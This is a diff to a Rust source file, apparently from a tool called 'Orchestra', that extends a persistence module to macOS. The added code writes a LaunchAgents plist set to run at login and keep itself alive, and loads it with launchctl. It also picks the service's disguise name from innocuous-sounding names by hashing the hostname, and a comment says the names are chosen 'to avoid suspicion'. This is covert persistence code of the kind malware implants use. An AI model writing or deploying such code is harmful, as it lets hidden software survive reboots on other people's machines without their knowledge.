@@ -10,7 +10,7 @@
 //! `ORCHESTRA_PERSISTENCE_ROOT` environment variable to redirect filesystem
 //! writes into a temporary directory.
 
-#[cfg(any(target_os = "linux", target_os = "windows"))]
+#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
 use anyhow::Context;
 use anyhow::Result;
 use rand::seq::SliceRandom;
@@ -25,20 +25,24 @@ use winreg::RegKey;
 fn get_service_name() -> &'static str {
     // A small, static selection to avoid suspicion.
     let potential_names = ["UserSessionHelper", "ConfigSync", "DisplayCache"];
-    // This is not cryptographically secure, but it doesn't need to be.
-    // We just want a different name on different machines.
-    let index = (std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_secs()
-        % potential_names.len() as u64) as usize;
-    potential_names[index]
+    
+    // Deterministic selection based on the hostname.
+    let hostname = std::env::var("HOSTNAME")
+        .or_else(|_| std::env::var("COMPUTERNAME"))
+        .unwrap_or_else(|_| "localhost".to_string());
+        
+    let mut sum: usize = 0;
+    for b in hostname.bytes() {
+        sum = sum.wrapping_add(b as usize);
+    }
+    
+    potential_names[sum % potential_names.len()]
 }
 
 /// Determine where the persistence-related files should live. In production
 /// this is `$XDG_CONFIG_HOME` or `%APPDATA%`. In tests, the root can be
 /// overridden via `ORCHESTRA_PERSISTENCE_ROOT`.
-#[cfg(any(target_os = "linux", target_os = "windows"))]
+#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
 fn config_root() -> PathBuf {
     if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
         return PathBuf::from(p);
@@ -289,18 +293,94 @@ fn uninstall_persistence_inner() -> Result<()> {
     Ok(())
 }
 
-#[cfg(not(any(target_os = "linux", target_os = "windows")))]
+
+#[cfg(target_os = "macos")]
+fn plist_path() -> PathBuf {
+    if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
+        return PathBuf::from(p).join(format!("{}.plist", get_service_name()));
+    }
+    if let Some(dir) = directories::BaseDirs::new() {
+        dir.home_dir().join("Library").join("LaunchAgents").join(format!("{}.plist", get_service_name()))
+    } else {
+        PathBuf::from(format!("{}.plist", get_service_name()))
+    }
+}
+
+#[cfg(target_os = "macos")]
+fn install_persistence_inner() -> Result<PathBuf> {
+    let path = plist_path();
+    if let Some(parent) = path.parent() {
+        std::fs::create_dir_all(parent)
+            .with_context(|| format!("Failed to create LaunchAgents directory {}", parent.display()))?;
+    }
+
+    let exe_path = std::env::current_exe()
+        .context("Failed to get current executable path")?
+        .display()
+        .to_string();
+
+    let service_name = get_service_name();
+    let plist = format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"#,
+        service_name, exe_path
+    );
+
+    std::fs::write(&path, plist)
+        .with_context(|| format!("Failed to write plist file {}", path.display()))?;
+
+    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
+        let status = std::process::Command::new("launchctl")
+            .args(["load", &path.to_string_lossy().to_string()])
+            .status()?;
+        if !status.success() {
+            anyhow::bail!("launchctl load failed with status: {status}");
+        }
+    }
+    Ok(path)
+}
+
+#[cfg(target_os = "macos")]
+fn uninstall_persistence_inner() -> Result<()> {
+    let path = plist_path();
+    if path.exists() {
+        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
+            let _ = std::process::Command::new("launchctl")
+                .args(["unload", &path.to_string_lossy().to_string()])
+                .status();
+        }
+        std::fs::remove_file(&path)
+            .with_context(|| format!("Failed to remove {}", path.display()))?;
+    }
+    Ok(())
+}
+#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
 fn install_persistence_inner() -> Result<PathBuf> {
     anyhow::bail!("Persistence is not implemented on this platform")
 }
 
-#[cfg(not(any(target_os = "linux", target_os = "windows")))]
+#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
 fn uninstall_persistence_inner() -> Result<()> {
     Ok(())
 }
 
 #[cfg(test)]
-#[cfg(any(target_os = "linux", target_os = "windows"))]
+#[cfg(any(target_os = "linux", target_os = "windows", target_os = "macos"))]
 mod tests {
     use super::*;
     use tempfile::tempdir;
